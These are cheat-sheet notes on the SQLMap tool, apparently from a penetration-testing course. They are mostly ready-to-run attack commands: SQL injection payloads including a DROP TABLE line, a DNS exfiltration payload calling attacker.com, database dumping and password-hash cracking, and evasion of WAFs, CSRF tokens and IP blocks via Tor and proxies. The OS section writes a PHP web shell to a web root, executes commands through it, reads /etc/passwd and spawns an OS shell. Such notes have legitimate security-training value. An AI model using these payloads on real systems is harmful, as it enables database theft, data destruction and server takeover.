# SQLMap Essentials

## 🎯 Main Idea
- SQLMap is an open-source Python tool that automates detection and exploitation of SQL injection (SQLi).
- Supports all known SQLi types and the widest range of DBMSes of any SQLi tool.
- Covers full workflow: targeting/request setup, detection tuning, DB enumeration, protection bypass, and OS-level exploitation.

## 💥 Attack / Exploit Vectors

### SQL Injection Types (detection engine)
- SQLMap auto-detects and exploits every known SQLi class; techniques selected with `--technique` (default `BEUSTQ`).
- **Commands**
  - `AND 1=1` — Boolean-based blind (TRUE/FALSE response differentiation, ~1 bit/request)
  - `AND GTID_SUBSET(@@version,0)` — Error-based (data returned in DBMS error, chunks ~200 bytes)
  - `UNION ALL SELECT 1,@@version,3` — UNION query-based (fastest, whole table in one request)
  - `; DROP TABLE users` — Stacked queries / piggy-backing (needs platform support)
  - `AND 1=IF(2>1,SLEEP(5),0)` — Time-based blind (response delay = TRUE)
  - `SELECT (SELECT @@version) from` — Inline queries
  - `LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\README.txt'))` — Out-of-band (DNS exfiltration)

### Targeting & Request Setup
- Feed SQLMap the request via URL, POST data, cookies, headers, or a full request file; mark injection point with `*`.
- **Commands**
  - `sqlmap -u "http://www.example.com/vuln.php?id=1" --batch` — GET target, no prompts
  - `sqlmap 'http://www.example.com/' --data 'uid=1&name=test'` — POST request
  - `sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'` — mark injection point with `*`
  - `sqlmap -u "...?id=1" -p uid` — restrict testing to one parameter
  - `sqlmap -r req.txt` — load full HTTP request (Burp capture, supports JSON/XML bodies)
  - `sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'` — set cookie header
  - `sqlmap -u www.target.com --data='id=1' --method PUT` — force HTTP method
  - `sqlmap ... --cookie="id=1*"` — inject inside a header value
  - `sqlmap ... --random-agent` / `--mobile` — randomize/spoof User-Agent

### Attack Tuning (detection help)
- Adjust boundaries (prefix/suffix) and payload breadth when default run misses the injection.
- **Commands**
  - `sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"` — custom boundaries
  - `sqlmap -u www.example.com/?id=1 -v 3 --level=5` — raise level (1-5, more boundaries/vectors)
  - `sqlmap -u www.example.com/?id=1 --level=5 --risk=3` — raise risk (1-3, enables OR/dangerous payloads)
  - `--code=200` — fixate TRUE detection on an HTTP status code
  - `--titles` — compare on `<title>` content
  - `--string=success` — compare on a string present only in TRUE responses
  - `--text-only` — compare on visible text (strip HTML tags)
  - `--technique=BEU` — restrict to chosen SQLi techniques
  - `--union-cols=17` / `--union-char='a'` / `--union-from=users` — UNION tuning

### Database Enumeration
- Retrieve DB metadata and dump table/row content after injection is confirmed.
- **Commands**
  - `sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba` — basic enumeration
  - `sqlmap -u "...?id=1" --tables -D testdb` — list tables in a DB
  - `sqlmap -u "...?id=1" --dump -T users -D testdb -C name,surname` — dump table/columns
  - `sqlmap -u "...?id=1" --dump -T users -D testdb --start=2 --stop=3` — limit rows by ordinal
  - `sqlmap -u "...?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"` — conditional dump
  - `--dump -D testdb` / `--dump-all --exclude-sysdbs` — dump whole DB / all DBs (skip system DBs)
  - `--dump-format` — output as CSV (default), HTML, or SQLite

### Advanced Enumeration
- Map schema, search for identifiers, and auto-crack recovered hashes.
- **Commands**
  - `sqlmap -u "...?id=1" --schema` — full DB schema/structure
  - `sqlmap -u "...?id=1" --search -T user` — search table names (LIKE)
  - `sqlmap -u "...?id=1" --search -C pass` — search column names
  - `sqlmap -u "...?id=1" --passwords --batch` — dump & dictionary-crack DB user password hashes
  - `--all --batch` — automatically enumerate everything accessible

### Bypassing Web Application Protections
- Defeat anti-CSRF tokens, unique/calculated params, IP blacklists, WAFs, and keyword filters.
- **Commands**
  - `sqlmap -u "..." --data="id=1&csrf-token=WfF1..." --csrf-token="csrf-token"` — anti-CSRF token bypass
  - `sqlmap -u "...?id=1&rp=29125" --randomize=rp` — randomize a unique-value parameter
  - `sqlmap -u "...?id=1&h=..." --eval="import hashlib; h=hashlib.md5(id).hexdigest()"` — calculated parameter bypass
  - `--proxy="socks4://177.39.187.70:33283"` / `--proxy-file` — route through proxy / proxy list
  - `--tor` / `--check-tor` — anonymize via Tor and verify
  - `--random-agent` — bypass User-Agent blacklisting
  - `--skip-waf` — skip WAF heuristic test (less noise)
  - `--list-tampers` — list all tamper scripts
  - `--tamper=between,randomcase` — chain tamper scripts to bypass filters/WAF
  - `--chunked` — chunked transfer encoding to split blacklisted keywords
  - HPP: `?id=1&id=UNION&id=SELECT&id=...` — HTTP parameter pollution

### OS Exploitation
- Read/write server files and get OS command execution via the DBMS (needs privileges, often DBA).
- **Commands**
  - `sqlmap -u "...case1.php?id=1" --is-dba` — check DBA privileges
  - `sqlmap -u "...?id=1" --file-read "/etc/passwd"` — read a local file
  - `LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE passwd;` — underlying MySQL file-read SQL
  - `echo '<?php system($_GET["cmd"]); ?>' > shell.php` — build PHP web shell
  - `sqlmap -u "...?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"` — write web shell
  - `curl http://www.example.com/shell.php?cmd=ls+-la` — execute via uploaded shell
  - `sqlmap -u "...?id=1" --os-shell` — spawn interactive OS shell (UDF/xp_cmdshell/file-stager)
  - `sqlmap -u "...?id=1" --os-shell --technique=E` — force error-based for direct output

### General Commands
- **Commands**
  - `sqlmap -h` / `sqlmap -hh` — basic / advanced help
  - `sqlmap -u "..." --batch -t /tmp/traffic.txt` — store full traffic to file
  - `sqlmap -u "..." -v 6 --batch` — raise verbosity (0-6)
  - `--parse-errors` — parse and display DBMS error messages

## 🛠️ Key Tools & Concepts
- SQLMap — automated SQLi detection/exploitation engine (install: `sudo apt install sqlmap` or git clone)
- Payload = vector + boundaries (prefix/suffix) — core detection concept
- `queries.xml` — SQLMap's per-DBMS enumeration query definitions (inband vs blind)
- Tamper scripts — Python request modifiers (e.g. `between`, `space2comment`, `randomcase`, `base64encode`)
- identYwaf — WAF fingerprinting library (80 signatures)
- Burp / browser "Copy as cURL" — easiest way to build a correct request
- Built-in hash cracker — 31 hash types, 1.4M-entry dictionary
